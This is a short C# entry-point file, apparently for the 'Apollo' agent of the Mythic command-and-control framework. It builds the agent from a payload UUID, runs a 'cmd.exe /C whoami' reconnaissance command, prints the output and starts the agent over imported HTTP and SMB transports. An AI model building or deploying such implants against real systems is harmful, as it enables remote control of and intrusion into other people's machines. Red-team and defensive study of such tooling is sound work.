using System;
using PSKCryptography;
using HttpTransport;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Structs.MythicStructs;
using Apollo.Agent;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;
using Apollo.Peers.SMB;
using System.Linq;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;

namespace Apollo
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitializeProcThreadAttributeList(
         IntPtr lpAttributeList,
         int dwAttributeCount,
         int dwFlags,
         ref IntPtr lpSize);

        static void Main(string[] args)
        {
            // This is main execution.
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            IntPtr lpSize = IntPtr.Zero;
            
            

            var p = ap.GetProcessManager().NewProcess("cmd.exe", "/C whoami");
            p.OutputDataReceived += P_OutputDataReceived;
            p.ErrorDataReceieved += P_OutputDataReceived;
            p.Exit += P_Exit;
            if (p.Start())
            {
                p.WaitForExit();
            }
            ap.Start();
        }

        private static void P_Exit(object sender, EventArgs e)
        {
            Console.WriteLine("process exit");
        }

        private static void P_OutputDataReceived(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
        {
            Console.WriteLine(e.Data);
        }
    }
}
